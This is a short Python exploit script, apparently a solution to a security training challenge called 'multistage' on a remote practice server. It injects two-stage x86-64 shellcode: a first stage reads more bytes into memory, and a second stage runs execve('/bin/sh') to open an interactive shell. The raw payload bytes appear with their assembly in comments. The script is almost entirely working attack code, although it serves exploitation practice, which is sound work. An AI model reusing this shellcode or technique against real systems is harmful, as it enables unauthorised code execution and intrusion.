from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
HOST = "training.jinblack.it"
PORT = 2003
PROG = "./multistage"
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    b* 0x401240
    """)
    input("wait for gdb")
else:
    r = process(PROG)

r.recvuntil("What is your name?")

# read 0xff bytes at 0x404083 
# mov    rsi,0x404083
# xor    rax,rax
# mov    rdi,rax
# mov    dx,0xff
# syscall
payload = b"\x48\xC7\xC6\x83\x40\x40\x00\x48\x31\xC0\x48\x89\xC7\x66\xBA\xFF\x00\x0F\x05"

# payload = payload.ljust(1000,b"\x90")
# payload = cyclic(1000)
input("send...")
r.send(payload)

# execve('/bin/sh')
# xor    rax,rax
# mov    rax,0x3b
# movabs rbx,0x68732f6e69622f
# push   rbx
# mov    rdi,rsp
# xor    rbx,rbx
# push   rbx
# mov    rsi,rsp
# mov    rdx,rsi
# syscall
payload = b"\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xF2\x0F\x05" 

input("send...")
r.send(payload.ljust(0xff, b"\x90"))
r.interactive()
#0804c060
# mov rsi, rax
# xor rax, rax
# mov rdi, rax
# mov dx, 0xff
# syscall
